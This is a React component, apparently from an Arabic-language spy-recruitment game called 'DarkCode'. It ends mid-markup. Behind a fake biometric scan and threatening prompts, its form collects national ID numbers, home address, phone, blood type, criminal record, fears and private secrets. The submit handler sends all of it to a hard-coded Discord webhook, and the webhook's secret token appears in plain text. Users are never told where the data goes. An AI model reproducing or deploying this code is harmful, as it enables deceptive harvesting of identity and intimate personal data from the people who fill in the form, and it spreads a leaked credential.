import React, { useState, useEffect } from 'react';
import GlitchText from './GlitchText';
import { audioService } from '../services/audioService';
import { UserData } from '../types';
import { Play, Terminal, ScanEye, Fingerprint, ShieldCheck, Send, AlertTriangle, Lock, Dna, BrainCircuit, FileWarning, ChevronDown, BookOpen, Skull, BadgeAlert } from 'lucide-react';

interface IntroSectionProps {
    onComplete: (data: UserData) => void;
}

// Discord Webhook URL
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1210907621486231552/PslxfiAu-x1xm7BDLqxgYDVwrt3IMQtiHlS9qg40joULWxAesrGyhWNd-LI72pAsG2X4";

const IntroSection: React.FC<IntroSectionProps> = ({ onComplete }) => {
    const [step, setStep] = useState<'intro' | 'biometric' | 'form' | 'checking'>('intro');
    const [isStarting, setIsStarting] = useState(false);
    const [isRegistered, setIsRegistered] = useState(false);
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [showConfirmation, setShowConfirmation] = useState(false);
    const [scanProgress, setScanProgress] = useState(0);
    const [errors, setErrors] = useState<Record<string, string>>({});
    const [secretClickCount, setSecretClickCount] = useState(0);

    // Extensive Form State
    const [formData, setFormData] = useState<UserData>({
        realName: '', codeName: '', nationalId: '', nationality: '', maritalStatus: '',
        birthDate: '', city: '', address: '', phone: '', email: '', username: '', deviceModel: '',
        bloodType: '', height: '', weight: '', shoeSize: '', eyeColor: '', dominantHand: '', scars: '',
        education: '', job: '', languages: '', criminalRecord: '', govtWork: '', internetFast: '',
        worstFear: '', darkColor: '', voices: '', nightmare: '', loyalty: '', skill: '', sacrifice: '',
        trustGov: '', sleepHours: '', lastCry: '', secret: '', trolleyProblem: '', googleSearch: '',
        mindRead: '', feeling: '', lyingCheck: ''
    });

    useEffect(() => {
        const container = document.querySelector('.overflow-y-auto');
        if (container) {
            container.scrollTo({ top: 0, behavior: 'smooth' });
        }
    }, [step]);

    useEffect(() => {
        const storedData = localStorage.getItem('darkcode_agent_data');
        if (storedData) {
            try {
                const parsed = JSON.parse(storedData);
                setFormData(parsed);
                setIsRegistered(true);
            } catch (e) {
                console.error("Data corrupted");
            }
        }
    }, []);

    const handleStartClick = () => {
        audioService.play('click');
        if (isRegistered) {
            setStep('checking');
            audioService.play('success');
            setTimeout(() => {
                handleEnterDashboard();
            }, 3000);
        } else {
            setStep('biometric');
            audioService.play('swoosh');
            let progress = 0;
            const interval = setInterval(() => {
                progress += 5;
                setScanProgress(progress);
                audioService.play('typing');
                if (progress >= 100) {
                    clearInterval(interval);
                    setTimeout(() => {
                        setStep('form');
                        audioService.play('notification');
                    }, 500);
                }
            }, 150);
        }
    };

    const handleEnterDashboard = () => {
        setIsStarting(true);
        audioService.play('intro');
        setTimeout(() => {
            onComplete(formData);
        }, 2000);
    };

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
        setFormData({ ...formData, [e.target.name]: e.target.value });
        if (errors[e.target.name]) {
            setErrors(prev => {
                const newErrors = { ...prev };
                delete newErrors[e.target.name];
                return newErrors;
            });
        }
    };

    const handleFocus = () => {
        audioService.play('hover');
    };

    const handleSecretReset = () => {
        const newCount = secretClickCount + 1;
        setSecretClickCount(newCount);

        // Visual feedback for secret clicks (optional, subtle sound)
        if (newCount < 10) {
            audioService.play('click');
        }

        if (newCount >= 10) {
            audioService.play('power-down');
            localStorage.removeItem('darkcode_agent_data');
            window.location.reload();
        }
    };

    const validateForm = () => {
        const newErrors: Record<string, string> = {};
        const phoneRegex = /^(?:\+966|05)\d{8,9}$/;

        if (!formData.phone || !formData.phone.match(phoneRegex)) {
            newErrors.phone = "رقم الهاتف غير صحيح. يجب أن يبدأ بـ +966 أو 05";
        }
        if (!formData.realName || formData.realName.split(' ').length < 3) {
            newErrors.realName = "الاسم الكامل يجب أن يكون ثلاثياً على الأقل";
        }

        const requiredFields = ['codeName', 'username'];
        requiredFields.forEach(field => {
            if (!formData[field as keyof UserData]) {
                newErrors[field] = "هذا الحقل إجباري";
            }
        });

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handlePreSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        if (validateForm()) {
            audioService.play('alert');
            setShowConfirmation(true);
        } else {
            audioService.play('error');
            const firstError = document.querySelector('.error-message');
            firstError?.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
    };

    const handleFinalSubmit = async () => {
        setIsSubmitting(true);
        audioService.play('power-up');

        const payload = {
            content: "🚨 **تقرير تجنيد عميل جديد (سري للغاية - مستوى 5)** 🚨",
            embeds: [
                {
                    title: `📂 ملف تعريف العميل: ${formData.codeName}`,
                    description: "**تنبيه أمني:** تم استلام بيانات حيوية ونفسية شاملة. التحليل الرقمي قيد المعالجة...",
                    color: 0xff003c, // Neon Red
                    fields: [
                        {
                            name: "👤 الهوية الشخصية",
                            value: `**الاسم:** ${formData.realName}\n**تاريخ الميلاد:** ${formData.birthDate}\n**الهوية:** ${formData.nationalId}\n**الجنسية:** ${formData.nationality}\n**الحالة:** ${formData.maritalStatus}`,
                            inline: true
                        },
                        {
                            name: "📍 الموقع والاتصال",
                            value: `**المدينة:** ${formData.city}\n**العنوان:** ${formData.address}\n**الهاتف:** ${formData.phone}\n**Email:** ${formData.email}`,
                            inline: true
                        },
                        {
                            name: "📜 التاريخ والخلفية",
                            value: `**التعليم:** ${formData.education}\n**العمل:** ${formData.job}\n**اللغات:** ${formData.languages}\n**سوابق:** ${formData.criminalRecord}\n**حكومي:** ${formData.govtWork}\n**بدون نت:** ${formData.internetFast}`,
                            inline: false
                        },
                        {
                            name: "🧬 القياسات الحيوية",
                            value: `**الدم:** ${formData.bloodType} | **العيون:** ${formData.eyeColor}\n**الطول:** ${formData.height} | **الوزن:** ${formData.weight}\n**الحذاء:** ${formData.shoeSize} | **اليد:** ${formData.dominantHand}\n**علامات:** ${formData.scars}`,
                            inline: false
                        },
                        {
                            name: "💻 البصمة التقنية",
                            value: `**Username:** ${formData.username}\n**Device:** ${formData.deviceModel}`,
                            inline: true
                        },
                        {
                            name: "💀 النفسية: المخاوف والاضطرابات",
                            value: `**الخوف:** ${formData.worstFear}\n**الظلام:** ${formData.darkColor}\n**أصوات:** ${formData.voices}\n**كوابيس:** ${formData.nightmare}\n**آخر بكاء:** ${formData.lastCry}\n**نوم:** ${formData.sleepHours} ساعة`,
                            inline: false
                        },
                        {
                            name: "🛡️ الولاء والمهارات",
                            value: `**المهارة:** ${formData.skill}\n**الولاء:** ${formData.loyalty}\n**التضحية:** ${formData.sacrifice}\n**الثقة بالحكومة:** ${formData.trustGov}`,
                            inline: false
                        },
                        {
                            name: "🔒 الأسرار والمعضلات الأخلاقية",
                            value: `**السر:** ||${formData.secret}||\n**العربة:** ${formData.trolleyProblem}\n**بحث جوجل:** ${formData.googleSearch}\n**قراءة أفكار:** ${formData.mindRead}\n**الشعور:** ${formData.feeling}\n**الكذب:** ${formData.lyingCheck}`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: `DarkCode Intelligence | Session ID: ${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
                    },
                    timestamp: new Date().toISOString()
                }
            ]
        };

        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            });

            localStorage.setItem('darkcode_agent_data', JSON.stringify(formData));

            audioService.play('success');
            setStep('checking');
            setShowConfirmation(false);
            setTimeout(() => {
                handleEnterDashboard();
            }, 2000);

        } catch (error) {
            console.error("Transmission failed", error);
            audioService.play('error');
            setShowConfirmation(false);
            localStorage.setItem('darkcode_agent_data', JSON.stringify(formData)); // Save anyway
            handleEnterDashboard();
        } finally {
            setIsSubmitting(false);
        }
    };

    if (isStarting) {
        return (
            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black overflow-hidden">
                <div className="text-neon-blue font-mono text-2xl animate-pulse">
                    جاري تأكيد حالة التسجيل...
                </div>
            </div>
        );
    }

    // Shared Input Styles
    const inputClasses = "w-full bg-gray-900 border border-gray-700 text-white p-4 focus:border-neon-blue focus:shadow-[0_0_10px_rgba(0,217,255,0.2)] outline-none transition-all font-mono rounded-sm text-sm placeholder-gray-600";
    const labelClasses = "block text-gray-400 text-xs mb-2 font-bold uppercase tracking-wider";
    const errorClasses = "text-red-500 text-xs mt-1 font-bold animate-pulse error-message";

    return (
        <div className="fixed inset-0 z-50 bg-black font-cairo overflow-y-auto scrollbar-hide text-right" dir="rtl">
            {/* PREMIUM BACKGROUND */}
            <div className="fixed inset-0 pointer-events-none overflow-hidden">
                {/* Base dark gradient */}
                <div className="absolute inset-0 bg-gradient-to-br from-[#020617] via-[#0a0a1a] to-[#000d1a]"></div>
                {/* Radial glow effect */}
                <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top,rgba(0,217,255,0.08)_0%,transparent_60%)]"></div>
                <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_bottom_right,rgba(255,0,60,0.05)_0%,transparent_50%)]"></div>
                {/* Grid lines */}
                <div className="absolute inset-0 opacity-[0.04]" style={{ backgroundImage: 'linear-gradient(rgba(0,217,255,0.3) 1px, transparent 1px), linear-gradient(90deg, rgba(0,217,255,0.3) 1px, transparent 1px)', backgroundSize: '60px 60px' }}></div>
                {/* Carbon fibre texture */}
                <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')] opacity-20"></div>
                {/* Vignette */}
                <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,transparent_30%,rgba(0,0,0,0.7)_100%)]"></div>
            </div>

            <div className="relative z-10 w-full min-h-screen flex flex-col items-center py-10 px-4">

                {/* Header */}
                <div className="mb-8 text-center animate-pulse-fast select-none cursor-pointer" onClick={handleSecretReset}>
                    <h1 className="text-5xl md:text-7xl font-black text-white mb-2 tracking-tighter">
                        <GlitchText text="DARK" />
                        <span className="text-neon-blue">CODE</span>
                    </h1>
                    <div className="text-xs font-mono text-red-500 tracking-[0.5em] uppercase border-y border-red-900/50 py-1 inline-block">
                        منطقة محظورة :: تصريح أمني مطلوب
                    </div>
                </div>

                {/* STEP 1: INTRO */}
                {step === 'intro' && (
                    <div className="bg-black/80 backdrop-blur-md border border-neon-blue/30 p-8 md:p-10 rounded-sm neon-box w-full max-w-xl text-center animate-fade-in-up">
                        <h2 className="text-3xl text-white font-bold flex items-center justify-center gap-3 mb-8">
                            <Terminal className="text-neon-blue" />
                            <span>بروتوكول التجنيد الإجباري</span>
                        </h2>

                        {/* VIDEO CONTAINER */}
                        <div className="relative w-full max-w-sm mx-auto aspect-video mb-8 border border-white/10 shadow-2xl overflow-hidden group rounded-sm">
                            <iframe
                                src="https://www.youtube.com/embed/1EVdP3i4AQs?autoplay=1&mute=0&controls=1&rel=0"
                                className="absolute inset-0 w-full h-full"
                                allow="autoplay; encrypted-media; picture-in-picture"
                                allowFullScreen
                                title="Recruitment Video"
                            />
                            <div className="absolute top-0 right-0 bg-red-600 text-white text-[10px] px-2 py-0.5 font-mono animate-pulse uppercase">
                                تنبيه: محتوى سري للغاية
                            </div>
                        </div>

                        <div className="py-4 border-y border-white/10 my-6 space-y-2">
                            <p className="text-xl text-gray-200 leading-relaxed font-bold">
                                <ScanEye className="inline-block ml-2 text-neon-alert animate-pulse" size={24} />
                                شاهد التعليمات أعلاه قبل المتابعة...
                            </p>
                            <p className="text-sm text-neon-blue/60 font-mono">
                                نحن نراقب اهتمامك بالتفاصيل. المهمة تتطلب تركيزاً كاملاً.
                            </p>
                        </div>

                        <div className="mt-8">
                            <p className="text-2xl text-white font-bold mb-6">
                                هل أنت جاهز لتسليم حياتك للمهمة؟
                            </p>
                            <button
                                onClick={handleStartClick}
                                onMouseEnter={() => audioService.play('hover')}
                                className="group relative w-full md:w-auto inline-flex items-center justify-center px-16 py-4 text-xl font-bold text-black transition-all duration-300 bg-neon-blue font-cairo hover:scale-105 shadow-[0_0_30px_rgba(0,217,255,0.3)]"
                            >
                                <span className="relative flex items-center gap-3">
                                    نعم، أنا جاهز (بدء التحقيق)
                                    <Play size={24} fill="currentColor" />
                                </span>
                            </button>
                            {isRegistered && (
                                <p className="mt-4 text-green-500 font-mono text-xs flex items-center justify-center gap-2">
                                    <Fingerprint size={12} />
                                    تم التحقق من البصمة الوراثية الرقمية مسبقاً
                                </p>
                            )}
                        </div>
                    </div>
                )}

                {/* STEP 1.5: BIOMETRIC SCAN */}
                {step === 'biometric' && (
                    <div className="bg-black/90 backdrop-blur-xl border border-neon-blue/50 p-12 rounded-sm neon-box w-full max-w-lg text-center animate-pulse">
                        <Fingerprint className="w-32 h-32 text-neon-blue mx-auto mb-6 animate-[ping_2s_infinite]" />
                        <h2 className="text-2xl font-bold text-white mb-4">جاري مسح البصمة الحيوية</h2>
                        <div className="text-left font-mono text-xs text-neon-blue mb-2">
                            SCANNING... {scanProgress}%
                        </div>
                        <div className="w-full bg-gray-900 h-4 rounded-full overflow-hidden border border-neon-blue/30">
                            <div
                                className="h-full bg-neon-blue transition-all duration-150 relative"
                                style={{ width: `${scanProgress}%` }}
                            >
                                <div className="absolute inset-0 bg-white/30 animate-shimmer"></div>
                            </div>
                        </div>
                        <div className="mt-4 text-xs font-mono text-red-500">
                            DO NOT MOVE YOUR DEVICE
                        </div>
                    </div>
                )}

                {/* STEP 2: CHECKING */}
                {step === 'checking' && (
                    <div className="bg-black/90 backdrop-blur-xl border border-green-500/50 p-12 rounded-sm neon-box w-full max-w-lg text-center animate-fade-in-up mt-20">
                        <ShieldCheck className="w-24 h-24 text-green-500 mx-auto mb-6 animate-pulse" />
                        <h2 className="text-3xl font-bold text-white mb-2">تم تأكيد الملف الأمني</h2>
                        <p className="text-green-400 font-mono mb-8">أهلاً بعودتك أيها العميل {formData.codeName}. سجلاتك مطابقة.</p>
                        <div className="w-full bg-gray-900 h-1 rounded-full overflow-hidden">
                            <div className="h-full bg-green-500 animate-[width_2s_ease-in-out_forwards] w-full shadow-[0_0_10px_#00ff00]"></div>
                        </div>
                    </div>
                )}

                {/* STEP 3: THE MASSIVE FORM */}
                {step === 'form' && (
                    <form onSubmit={handlePreSubmit} className="w-full max-w-4xl animate-fade-in-up pb-20">

                        <div className="bg-red-900/20 border border-red-500/50 p-4 mb-6 text-center text-red-400 font-mono text-sm animate-pulse flex items-center justify-center gap-3 rounded-sm">
                            <AlertTriangle className="inline-block" size={20} />
                            <span>تحذير: يجب تعبئة جميع الحقول بدقة متناهية. أي محاولة للكذب ستؤدي للإقصاء الفوري ومسح البيانات.</span>
                        </div>

                        {/* Section 1: Identity */}
                        <div className="bg-black/90 backdrop-blur-md border border-neon-blue/30 p-6 md:p-8 rounded-sm neon-box mb-6 relative overflow-hidden group hover:border-neon-blue/60 transition-colors">
                            <div className="absolute top-0 right-0 p-2 opacity-10"><Fingerprint size={100} /></div>
                            <h3 className="text-2xl text-neon-blue font-bold mb-6 flex items-center gap-2 border-b border-white/10 pb-4">
                                <span className="bg-neon-blue text-black px-2 py-1 text-sm rounded-sm">01</span>
                                بيانات الهوية (Identity)
                            </h3>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div className="col-span-1 md:col-span-2">
                                    <label className={labelClasses}>الاسم الحقيقي الكامل</label>
                                    <input required name="realName" type="text" onChange={handleChange} onFocus={handleFocus} className={inputClasses} placeholder="الاسم الرباعي كما في الوثائق..." />
                                    {errors.realName && <div className={errorClasses}>{errors.realName}</div>}
                                </div>
                                <div>
                                    <label className={labelClasses}>الاسم الحركي (Code Name)</label>
                                    <input required name="codeName" type="text" onChange={handleChange} onFocus={handleFocus} className={inputClasses} placeholder="اللقب السري..." />
                                </div>
                                <div>
                                    <label className={labelClasses}>رقم الهوية الوطنية</label>
                                    <input name="nationalId" type="text" onChange={handleChange} onFocus={handleFocus} className={inputClasses} placeholder="ID Number..." />
                                </div>
                                <div>
                                    <label className={labelClasses}>الجنسية</label>
                                    <input name="nationality" type="text" onChange={handleChange} onFocus={handleFocus} className={inputClasses} placeholder="الجنسية..." />
                                </div>
                                <div>
                                    <label className={labelClasses}>الحالة الاجتماعية</label>
                                    <div className="relative">
                                        <select name="maritalStatus" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} appearance-none cursor-pointer [&>option]:bg-gray-900 [&>option]:text-white`}>
                                            <option value="">اختر...</option>
                                            <option value="single">أعزب/عزباء</option>
                                            <option value="married">متزوج/ـة</option>
                                            <option value="divorced">مطلق/ـة</option>
                                            <option value="widowed">أرمل/ـة</option>
                                        </select>
                                        <ChevronDown className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none" size={16} />
                                    </div>
                                </div>
                                <div>
                                    <label className={labelClasses}>تاريخ الميلاد</label>
                                    <input name="birthDate" type="date" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} text-right appearance-none`} />
                                </div>
                                <div>
                                    <label className={labelClasses}>المدينة الحالية</label>
                                    <input name="city" type="text" onChange={handleChange} onFocus={handleFocus} className={inputClasses} placeholder="مقر الإقامة..." />
                                </div>
                                <div className="col-span-1 md:col-span-2">
                                    <label className={labelClasses}>العنوان التفصيلي (للطوارئ)</label>
                                    <textarea name="address" rows={2} onChange={handleChange} onFocus={handleFocus} className={inputClasses} placeholder="اسم الشارع، رقم المبنى، الرمز البريدي..." />
                                </div>
                            </div>
                        </div>

                        {/* Section 1.5: Background & History */}
                        <div className="bg-black/90 backdrop-blur-md border border-neon-blue/30 p-6 md:p-8 rounded-sm neon-box mb-6 relative group hover:border-yellow-500/60 transition-colors">
                            <div className="absolute top-0 right-0 p-2 opacity-10"><BookOpen size={100} /></div>
                            <h3 className="text-2xl text-yellow-400 font-bold mb-6 flex items-center gap-2 border-b border-white/10 pb-4">
                                <span className="bg-yellow-500 text-black px-2 py-1 text-sm rounded-sm">02</span>
                                التاريخ والخلفية (Background)
                            </h3>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div>
                                    <label className={labelClasses}>المؤهل الدراسي</label>
                                    <input name="education" type="text" onChange={handleChange} onFocus={handleFocus} className={inputClasses} placeholder="ثانوي، بكالوريوس، دكتوراه..." />
                                </div>
                                <div>
                                    <label className={labelClasses}>مجال العمل/الدراسة الحالي</label>
                                    <input name="job" type="text" onChange={handleChange} onFocus={handleFocus} className={inputClasses} />
                                </div>
                                <div className="col-span-1 md:col-span-2">
                                    <label className={labelClasses}>كم لغة تتحدث؟ (اذكرها)</label>
                                    <input name="languages" type="text" onChange={handleChange} onFocus={handleFocus} className={inputClasses} placeholder="العربية، الإنجليزية..." />
                                </div>
                                <div>
                                    <label className={labelClasses}>هل لديك سجل جنائي؟</label>
                                    <div className="relative">
                                        <select name="criminalRecord" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} appearance-none cursor-pointer [&>option]:bg-gray-900 [&>option]:text-white`}>
                                            <option value="">اختر...</option>
                                            <option value="no">لا يوجد</option>
                                            <option value="minor">مخالفات بسيطة</option>
                                            <option value="yes">نعم (سوابق)</option>
                                        </select>
                                        <ChevronDown className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none" size={16} />
                                    </div>
                                </div>
                                <div>
                                    <label className={labelClasses}>هل سبق أن عملت مع جهة حكومية؟</label>
                                    <div className="relative">
                                        <select name="govtWork" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} appearance-none cursor-pointer [&>option]:bg-gray-900 [&>option]:text-white`}>
                                            <option value="">اختر...</option>
                                            <option value="no">لا</option>
                                            <option value="yes">نعم</option>
                                            <option value="currently">ما زلت أعمل</option>
                                        </select>
                                        <ChevronDown className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none" size={16} />
                                    </div>
                                </div>
                                <div className="col-span-1 md:col-span-2">
                                    <label className={labelClasses}>أطول مدة بقيت فيها بدون إنترنت؟</label>
                                    <input name="internetFast" type="text" onChange={handleChange} onFocus={handleFocus} className={inputClasses} placeholder="يوم، أسبوع، شهر..." />
                                </div>
                            </div>
                        </div>

                        {/* Section 2: Contact */}
                        <div className="bg-black/90 backdrop-blur-md border border-neon-blue/30 p-6 md:p-8 rounded-sm neon-box mb-6 relative group hover:border-neon-blue/60 transition-colors">
                            <div className="absolute top-0 right-0 p-2 opacity-10"><Lock size={100} /></div>
                            <h3 className="text-2xl text-neon-blue font-bold mb-6 flex items-center gap-2 border-b border-white/10 pb-4">
                                <span className="bg-neon-blue text-black px-2 py-1 text-sm rounded-sm">03</span>
                                قنوات الاتصال (Comms)
                            </h3>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div>
                                    <label className={labelClasses}>رقم الهاتف الشخصي</label>
                                    <input required name="phone" type="tel" onChange={handleChange} onFocus={handleFocus} className={inputClasses} dir="ltr" placeholder="+9665..." />
                                    {errors.phone && <div className={errorClasses}>{errors.phone}</div>}
                                </div>
                                <div>
                                    <label className={labelClasses}>البريد الإلكتروني الأساسي</label>
                                    <input name="email" type="email" onChange={handleChange} onFocus={handleFocus} className={inputClasses} dir="ltr" placeholder="email@example.com" />
                                </div>
                                <div>
                                    <label className={labelClasses}>اسم المستخدم (Username)</label>
                                    <input required name="username" type="text" onChange={handleChange} onFocus={handleFocus} className={inputClasses} dir="ltr" />
                                </div>
                                <div>
                                    <label className={labelClasses}>نوع الهاتف/الجهاز الحالي</label>
                                    <input name="deviceModel" type="text" onChange={handleChange} onFocus={handleFocus} className={inputClasses} placeholder="iPhone 15, PC, Android..." />
                                </div>
                            </div>
                        </div>

                        {/* Section 3: Biological */}
                        <div className="bg-black/90 backdrop-blur-md border border-neon-blue/30 p-6 md:p-8 rounded-sm neon-box mb-6 relative group hover:border-purple-500/60 transition-colors">
                            <div className="absolute top-0 right-0 p-2 opacity-10"><Dna size={100} /></div>
                            <h3 className="text-2xl text-purple-400 font-bold mb-6 flex items-center gap-2 border-b border-white/10 pb-4">
                                <span className="bg-purple-500 text-black px-2 py-1 text-sm rounded-sm">04</span>
                                البيانات الحيوية (Bio-Data)
                            </h3>
                            <div className="grid grid-cols-1 md:grid-cols-4 gap-4 md:gap-6">
                                <div className="col-span-1">
                                    <label className={labelClasses}>فصيلة الدم</label>
                                    <div className="relative">
                                        <select name="bloodType" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} appearance-none cursor-pointer [&>option]:bg-gray-900 [&>option]:text-white`}>
                                            <option value="" className="text-gray-500">اختر...</option>
                                            <option value="A+">A+</option><option value="A-">A-</option>
                                            <option value="B+">B+</option><option value="B-">B-</option>
                                            <option value="O+">O+</option><option value="O-">O-</option>
                                            <option value="AB+">AB+</option><option value="AB-">AB-</option>
                                        </select>
                                        <ChevronDown className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none" size={16} />
                                    </div>
                                </div>
                                <div className="col-span-1">
                                    <label className={labelClasses}>الطول (سم)</label>
                                    <input name="height" type="number" onChange={handleChange} onFocus={handleFocus} className={inputClasses} placeholder="175" />
                                </div>
                                <div className="col-span-1">
                                    <label className={labelClasses}>الوزن (كجم)</label>
                                    <input name="weight" type="number" onChange={handleChange} onFocus={handleFocus} className={inputClasses} placeholder="70" />
                                </div>
                                <div className="col-span-1">
                                    <label className={labelClasses}>مقاس الحذاء</label>
                                    <input name="shoeSize" type="number" onChange={handleChange} onFocus={handleFocus} className={inputClasses} placeholder="42" />
                                </div>
                                <div className="col-span-1 md:col-span-2">
                                    <label className={labelClasses}>لون العينين</label>
                                    <input name="eyeColor" type="text" onChange={handleChange} onFocus={handleFocus} className={inputClasses} placeholder="بني، أخضر، أزرق..." />
                                </div>
                                <div className="col-span-1 md:col-span-2">
                                    <label className={labelClasses}>اليد المستخدمة</label>
                                    <div className="relative">
                                        <select name="dominantHand" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} appearance-none cursor-pointer [&>option]:bg-gray-900 [&>option]:text-white`}>
                                            <option value="">اختر...</option>
                                            <option value="right">اليمنى</option>
                                            <option value="left">اليسرى</option>
                                            <option value="ambidextrous">كلتا اليدين</option>
                                        </select>
                                        <ChevronDown className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none" size={16} />
                                    </div>
                                </div>
                                <div className="col-span-1 md:col-span-4">
                                    <label className={labelClasses}>هل لديك ندوب، وشم، أو علامات مميزة؟</label>
                                    <textarea name="scars" rows={2} onChange={handleChange} onFocus={handleFocus} className={inputClasses} placeholder="صفها بدقة: لا يوجد / يوجد جرح في الذراع الأيسر..." />
                                </div>
                            </div>
                        </div>

                        {/* Section 4: Psychological */}
                        <div className="bg-black/90 backdrop-blur-md border border-neon-blue/30 p-6 md:p-8 rounded-sm neon-box mb-8 relative group hover:border-red-500/60 transition-colors">
                            <div className="absolute top-0 right-0 p-2 opacity-10"><BrainCircuit size={100} /></div>
                            <h3 className="text-2xl text-red-500 font-bold mb-6 flex items-center gap-2 border-b border-white/10 pb-4">
                                <span className="bg-red-600 text-white px-2 py-1 text-sm rounded-sm">05</span>
                                التحليل النفسي والولاء (Psycho-Analysis)
                            </h3>
                            <div className="space-y-6">
                                <div>
                                    <label className={`${labelClasses} text-white`}>ما هو أكبر مخاوفك في الحياة؟ (كن صادقاً لأننا نعلم)</label>
                                    <input name="worstFear" type="text" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-900 focus:border-red-500`} />
                                </div>
                                <div>
                                    <label className={`${labelClasses} text-white`}>هل تثق بالحكومة؟ (كن صادقاً، نحن لسنا جزءاً منها)</label>
                                    <div className="relative">
                                        <select name="trustGov" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-900 focus:border-red-500 appearance-none cursor-pointer [&>option]:bg-gray-900 [&>option]:text-white`}>
                                            <option value="">اختر الإجابة...</option>
                                            <option value="yes">نعم تماماً</option>
                                            <option value="somewhat">إلى حد ما</option>
                                            <option value="no">لا إطلاقاً</option>
                                            <option value="unknown">لا أعرف من أثق به</option>
                                        </select>
                                        <ChevronDown className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none" size={16} />
                                    </div>
                                </div>
                                <div>
                                    <label className={`${labelClasses} text-white`}>كم ساعة تنام يومياً؟ (الأرق مؤشر مهم)</label>
                                    <input name="sleepHours" type="number" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-900 focus:border-red-500`} />
                                </div>
                                <div>
                                    <label className={`${labelClasses} text-white`}>آخر مرة بكيت فيها، ما السبب؟</label>
                                    <textarea name="lastCry" rows={1} onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-900 focus:border-red-500`} />
                                </div>
                                <div>
                                    <label className={`${labelClasses} text-white text-lg font-black`}>ما هو الشيء الذي فعلته ولم تخبر به أحداً قط؟ (سؤال جوهري)</label>
                                    <textarea name="secret" rows={2} onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-500 focus:border-red-500 bg-red-900/10 placeholder-red-300/30`} placeholder="اكتب هنا..." />
                                </div>
                                <div>
                                    <label className={`${labelClasses} text-white`}>تخيل أنك محاصر: هل تختار إنقاذ 5 غرباء أم شخص واحد تحبه؟</label>
                                    <div className="relative">
                                        <select name="trolleyProblem" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-900 focus:border-red-500 appearance-none cursor-pointer [&>option]:bg-gray-900 [&>option]:text-white`}>
                                            <option value="">اختر القرار...</option>
                                            <option value="5_strangers">5 غرباء</option>
                                            <option value="1_loved">شخص واحد أحبه</option>
                                            <option value="none">لن أتدخل</option>
                                        </select>
                                        <ChevronDown className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none" size={16} />
                                    </div>
                                </div>
                                <div>
                                    <label className={`${labelClasses} text-white`}>ما هو آخر شيء بحثت عنه في Google؟ (سنتحقق)</label>
                                    <input name="googleSearch" type="text" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-900 focus:border-red-500`} />
                                </div>
                                <div>
                                    <label className={`${labelClasses} text-white`}>لو أعطيناك القدرة على قراءة الأفكار ليوم واحد، من ستختار؟</label>
                                    <input name="mindRead" type="text" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-900 focus:border-red-500`} />
                                </div>
                                <div>
                                    <label className={`${labelClasses} text-white`}>صف شعورك الآن بكلمة واحدة فقط</label>
                                    <input name="feeling" type="text" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-900 focus:border-red-500`} />
                                </div>
                                <div>
                                    <label className={`${labelClasses} text-white`}>هل سبق وكذبت في هذا النموذج؟</label>
                                    <div className="relative">
                                        <select name="lyingCheck" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-900 focus:border-red-500 appearance-none cursor-pointer [&>option]:bg-gray-900 [&>option]:text-white`}>
                                            <option value="">كن صادقاً...</option>
                                            <option value="no">لا</option>
                                            <option value="yes">نعم</option>
                                            <option value="maybe">ربما</option>
                                            <option value="refuse">لن أجيب</option>
                                        </select>
                                        <ChevronDown className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none" size={16} />
                                    </div>
                                </div>

                                {/* Old Questions Kept */}
                                <div>
                                    <label className={`${labelClasses} text-white`}>عندما تغمض عينيك في الظلام الدامس، ما هو اللون الذي تراه؟</label>
                                    <input name="darkColor" type="text" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-900 focus:border-red-500`} />
                                </div>
                                <div>
                                    <label className={`${labelClasses} text-white`}>هل سبق لك سماع أصوات تهمس باسمك ولا يوجد أحد حولك؟</label>
                                    <div className="relative">
                                        <select name="voices" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-900 focus:border-red-500 appearance-none cursor-pointer [&>option]:bg-gray-900 [&>option]:text-white`}>
                                            <option value="">اختر الإجابة...</option>
